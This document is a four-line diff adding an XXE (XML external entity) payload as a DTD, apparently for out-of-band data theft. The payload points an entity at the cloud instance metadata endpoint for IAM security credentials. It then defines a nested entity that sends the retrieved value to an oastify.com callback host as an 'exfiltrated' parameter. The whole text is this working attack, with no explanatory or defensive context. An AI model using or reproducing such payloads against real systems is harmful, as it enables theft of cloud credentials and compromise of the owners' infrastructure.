@@ -1,0 +1,4 @@
+<!ENTITY % data SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+<!ENTITY % shadow "<!ENTITY &#x25; send SYSTEM 'http://qe87xwo64k7y2mjj4hjarjfmhdn4b7zw.oastify.com/?exfiltrated=%data;'>">
+%shadow;
+%send;
